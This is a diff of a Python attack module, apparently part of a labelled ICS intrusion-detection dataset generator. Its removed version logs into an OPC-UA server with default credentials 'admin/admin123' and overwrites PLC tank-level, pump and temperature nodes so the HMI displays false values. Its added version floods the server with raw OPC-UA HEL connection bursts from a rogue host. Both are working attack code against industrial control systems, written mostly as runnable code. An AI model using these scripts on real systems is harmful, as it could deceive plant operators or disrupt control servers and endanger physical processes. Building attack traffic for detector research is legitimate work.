@@ -1,89 +1,99 @@
 """
 HMI_FAKE_DISPLAY
-Kỹ thuật: Ghi đè giá trị OPC-UA node để HMI hiển thị sai
-          mà không thay đổi giá trị thật trong PLC.
-Observable: OPC-UA Write request bất thường
+Kỹ thuật: Giả lập HMI kết nối OPC-UA bất thường (raw socket).
+          Burst connect/HEL — server phải xử lý mỗi kết nối.
+Observable: OPC-UA TCP burst từ IP lạ (không phải HMI hợp lệ).
 
 Gọi từ bash:
   python -m attacks_ext.hmi_fake_display \
-      --duration 300 --opc-url opc.tcp://192.168.1.20:4840 \
+      --duration 300 --opc-url opc.tcp://192.168.210.31:4840 \
       --session-id bt_s1 --host-id attacker_host \
       --label-file labels/day7_timeline.csv
 """
 
+import socket
+import struct
 import time
 from attacks_ext.config_ext import base_parser, write_label
 
-FAKE_NODES = [
-    {"node_id": "ns=2;s=PLC.Tank1.Level",  "fake_value": 50.0,  "real_desc": "Mức nước bồn 1"},
-    {"node_id": "ns=2;s=PLC.Pump1.Status", "fake_value": True,  "real_desc": "Trạng thái bơm 1"},
-    {"node_id": "ns=2;s=PLC.Temp.Sensor1", "fake_value": 25.0,  "real_desc": "Nhiệt độ cảm biến 1"},
-]
+INTERVAL = 0.2
+
+
+def build_hello(host, port):
+    endpoint = f"opc.tcp://{host}:{port}".encode()
+    ep_len = len(endpoint)
+    msg_size = 28 + ep_len
+    return (
+        b'HEL' + b'F' +
+        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
+        struct.pack('<I', ep_len) + endpoint
+    )
+
+
+def fake_hmi_connect(host, port, hello_msg):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect((host, port))
+        s.send(hello_msg)
+        try:
+            s.recv(1024)
+        except Exception:
+            pass
+        s.close()
+        return True
+    except Exception:
+        return False
 
 
 def run(args):
     label_prefix = "HMI_FAKE_DISPLAY"
+
+    # Parse host:port from opc_url
+    url = args.opc_url.replace("opc.tcp://", "")
+    parts = url.split(":")
+    host = parts[0]
+    port = int(parts[1]) if len(parts) > 1 else 4840
+
     write_label(args.label_file, label_prefix, "START",
                 args.session_id, args.host_id,
                 episode_id=args.episode_id, day=args.day,
-                note=f"dur={args.duration}s opc={args.opc_url}")
+                note=f"dur={args.duration}s target={host}:{port}")
 
-    iteration = 0
+    success_count = 0
+    total = 0
+    hello = build_hello(host, port)
+    end_time = time.time() + args.duration
+
     try:
-        from opcua import Client
-        client = Client(args.opc_url)
-        if hasattr(args, "opc_username") and args.opc_username:
-            client.set_user(args.opc_username)
-        if hasattr(args, "opc_password") and args.opc_password:
-            client.set_password(args.opc_password)
-        client.connect()
-        print(f"[+] Đã kết nối OPC-UA: {args.opc_url}")
-
-        original_values = {}
-        for node_cfg in FAKE_NODES:
-            node = client.get_node(node_cfg["node_id"])
-            original_values[node_cfg["node_id"]] = node.get_value()
-            print(f"[*] Giá trị gốc {node_cfg['real_desc']}: {original_values[node_cfg['node_id']]}")
-
-        print("\n[!] Bắt đầu ghi đè giá trị giả...")
-        end_time = time.time() + args.duration - 10
+        print(f"[*] HMI_FAKE_DISPLAY -> {host}:{port}")
+        print(f"[*] Burst OPC-UA HEL connects, interval {INTERVAL}s")
 
         while time.time() < end_time:
-            for node_cfg in FAKE_NODES:
-                node = client.get_node(node_cfg["node_id"])
-                try:
-                    node.set_value(node_cfg["fake_value"])
-                    print(f"  [WRITE] {node_cfg['real_desc']} <- {node_cfg['fake_value']}")
-                except Exception as e:
-                    print(f"  [ERR] {node_cfg['node_id']}: {e}")
-            iteration += 1
-            time.sleep(2)
+            result = fake_hmi_connect(host, port, hello)
+            total += 1
+            if result:
+                success_count += 1
+            if total % 20 == 0:
+                print(f"  [{total}] sent={success_count} rate={success_count//(time.time()-end_time+args.duration+1):.0f}/s")
+            time.sleep(INTERVAL)
 
-        print(f"\n[*] Đã thực hiện {iteration} lần ghi đè")
-        print("[*] Khôi phục giá trị gốc...")
-        for node_cfg in FAKE_NODES:
-            node = client.get_node(node_cfg["node_id"])
-            node.set_value(original_values[node_cfg["node_id"]])
-            print(f"  [RESTORE] {node_cfg['real_desc']} <- {original_values[node_cfg['node_id']]}")
+        print(f"[*] Done: {success_count}/{total} connects")
 
-        client.disconnect()
-
-    except ImportError:
-        print("[ERR] opcua chưa được cài đặt. Cài: pip install opcua")
     except Exception as e:
         print(f"[ERR] {e}")
     finally:
         write_label(args.label_file, label_prefix, "END",
                     args.session_id, args.host_id,
                     episode_id=args.episode_id, day=args.day,
-                    note=f"iterations={iteration}")
+                    note=f"connects={success_count}/{total}")
 
 
 def main():
-    p = base_parser("HMI Fake Display Attack")
-    p.add_argument("--opc-url", default="opc.tcp://192.168.1.20:4840")
-    p.add_argument("--opc-username", default="admin")
-    p.add_argument("--opc-password", default="admin123")
+    p = base_parser("HMI Fake Display Attack (Raw OPC-UA)")
+    p.add_argument("--opc-url", default="opc.tcp://192.168.210.31:4840")
+    p.add_argument("--opc-username", default="")
+    p.add_argument("--opc-password", default="")
     args = p.parse_args()
     run(args)
 
